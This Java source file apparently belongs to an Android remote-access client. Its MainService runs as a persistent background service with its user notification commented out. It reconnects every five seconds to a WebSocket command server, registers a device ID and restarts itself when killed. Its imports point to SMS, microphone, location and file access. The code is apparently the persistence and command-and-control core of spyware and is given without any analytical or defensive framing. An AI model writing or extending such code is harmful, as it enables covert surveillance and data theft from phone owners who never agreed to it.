package com.ot.grhq.client;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

import com.ot.grhq.client.functionality.FileManager;
import com.ot.grhq.client.functionality.Location;
import com.ot.grhq.client.functionality.PackageManager;
import com.ot.grhq.client.functionality.Utils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

public class MainService extends Service {

    private static WebSocketClient client;

    public static boolean isConnected = false;
    private final String SERVICE_RESTART_INTENT = "com.ot.grhq.receiver.restartservice";
    private NotificationManagerCompat notificationManager;
    final Handler handler = new Handler();
    final int delay = 5000;
    private Runnable task = new Runnable() {
        @Override
        public void run() {
            try {
                if (!isConnected) {
                    try {
                        connectToWebSocket();
                    } catch (Exception e) {
                    }
                }
                updateWebSocketID();
            } catch (Exception e) {
            }
            handler.postDelayed(this, delay);
        }
    };


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Create a notification builder
//        NotificationCompat.Builder builder = new NotificationCompat.Builder(this);
//
//        // Set the notification properties
//        builder.setSmallIcon(R.mipmap.ic_launcher);
//        builder.setContentTitle("");
//        builder.setContentText("");
//        builder.setPriority(NotificationCompat.PRIORITY_DEFAULT);
//
//        NotificationChannel channel = null;
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            channel = new NotificationChannel("njj", "jhh", NotificationManager.IMPORTANCE_HIGH);
//        }
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            channel.setDescription("PennSkanvTic channel for foreground service notification");
//        }
//
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            notificationManager = getSystemService(NotificationManagerCompat.class);
//        }
//        notificationManager.createNotificationChannel(channel);
//
//        // Create the notification
//        Notification notification = builder.build();
//
//        startForeground(1, notification);
        handler.post(task);

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        isConnected = false;
        Intent restartService = new Intent(SERVICE_RESTART_INTENT);
        sendBroadcast(restartService);
    }

    private void connectToWebSocket() throws Exception {
        client = new WebSocketClient(getApplicationContext(), new URI(Utils.WEB_SOCKET_SERVER));
        client.connect();
        isConnected = true;
    }

    private void updateWebSocketID() throws Exception {
        if (client.isOpen()) {
            JSONObject json = new JSONObject();
            json.put("id", Utils.clientID(getApplicationContext()));
            json.put("type", "client");
            json.put("res", "id");
            client.send(json.toString());
        }
    }
}


